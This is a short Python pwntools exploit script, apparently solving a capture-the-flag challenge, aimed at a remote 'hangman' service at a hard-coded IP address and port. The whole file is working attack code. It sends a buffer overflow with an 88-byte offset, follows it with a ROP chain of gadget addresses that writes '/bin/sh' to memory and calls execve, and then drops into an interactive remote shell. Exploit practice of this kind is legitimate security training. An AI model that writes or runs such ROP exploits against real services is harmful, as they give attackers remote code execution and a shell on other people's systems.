from pwn import *

elf = context.binary = ELF('./hangman')
#p = process('./hangman')
p = remote('167.99.118.184', 31339)

p.sendlineafter(b'Exit\n', b'2')

#Offset to rip
offset = 88

#Gadgets used in ROP
pop_rdi = 0x00000000004023af # pop rdi ; ret
pop_rsi = 0x000000000040a41e # pop rsi ; ret
pop_rax_rdx_rbx = 0x00000000004a3c4a # pop rax ; pop rdx ; pop rbx ; ret
syscall = 0x0000000000402164 # syscall
writable_mem = 0x00000000004e8000
mov_rax_rdx_pop_rbx = 0x00000000004aa468 # mov qword ptr [rax], rdx ; pop rbx ; ret
ret = 0x0000000000446fb9 + 1 # ret

rop = b''
rop += p64(ret)

#Assigning rax writable memory address and rdx the string we want
rop += p64(pop_rax_rdx_rbx)
rop += p64(writable_mem) + b"/bin/sh\x00" + p64(0)

#Moving the string into writable memory for access
rop += p64(mov_rax_rdx_pop_rbx)
rop += p64(0)

#Rax to 0x3b for execve, rdx to 0
rop += p64(pop_rax_rdx_rbx)
rop += p64(0x3b) + p64(0) + p64(0)

#rdi to our /bin/sh and rsi to 0
rop += p64(pop_rdi)
rop += p64(writable_mem)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(syscall)

#Sendoff
payload = b'A'*offset + rop
p.sendline(payload)
p.interactive()